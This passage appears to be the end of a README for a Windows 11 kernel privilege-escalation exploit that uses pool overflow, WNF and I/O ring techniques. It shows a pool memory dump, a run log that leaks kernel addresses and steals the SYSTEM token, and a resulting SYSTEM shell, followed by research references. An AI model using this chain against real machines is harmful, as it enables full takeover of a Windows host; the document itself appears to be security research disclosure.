0x000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000080: 00 00 05 03 4e 70 41 74 00 00 00 00 00 00 00 00  ....NpAt........
0x000090: d0 01 2b 47 0a d1 ff ff d0 01 2b 47 0a d1 ff ff  ..+G......+G....
0x0000a0: 38 81 2a 4d 0a d1 ff ff 16 00 00 00 00 00 00 00  8.*M............
0x0000b0: 3a 81 2a 4d 0a d1 ff ff 5a 00 41 41 41 41 41 41  :.*M....Z.AAAAAA
0x0000c0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0x0000d0: 00 00 05 03 57 6e 66 20 42 42 42 42 42 42 42 42  ....Wnf BBBBBBBB
0x0000e0: 00 00 00 00 50 ff 00 00 50 ff 00 00 01 00 00 00  ....P...P.......
0x0000f0: 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000120: 00 00 05 03 57 6e 66 20 42 42 42 42 42 42 42 42  ....Wnf BBBBBBBB
0x000130: 00 00 00 00 00 ff 00 00 00 ff 00 00 01 00 00 00  ................
0x000140: 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................


[+] regBuffers found and can be overwritten
[+] pipeAttribute found and can be read
[*] original_regBufferEntry: ffffe309f1b1a1a0
[*] pipeAttributeFlink: ffffd10a472b01d0
[+] found target handle
[*] targetHandle: 00000211216BC4D0
[*] ioring index: 425
[*] fileObject: ffffe309f134d7e0
[*] base of npfs.sys: fffff80631660000
[*] base of ntoskrnl.exe: fffff80628c00000
[*] system EPROCESS: ffffe309ea4c2040
[*] system TOKEN: ffffd10a3a246040
[*] curpid: 21c8
Microsoft Windows [Version 10.0.22631.4460]
(c) Microsoft Corporation. All rights reserved.

C:\Users\unpriv>whoami
nt authority\system

C:\Users\unpriv>exit
calling NtUpdateWnfStateData returned successfully
PS C:\Users\unpriv>
```

## References

* https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf
* https://www.nccgroup.com/us/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/
* https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/

## Acknowledgements

* [@cbayet](https://x.com/onlytheduck)
* [@paulfariello](https://x.com/paulfariello)
* [@alexjplaskett](https://x.com/alexjplaskett)
* [@yarden_shafir](https://x.com/yarden_shafir)
* [@InfosecIITR](https://x.com/InfoSecIITR)
 

```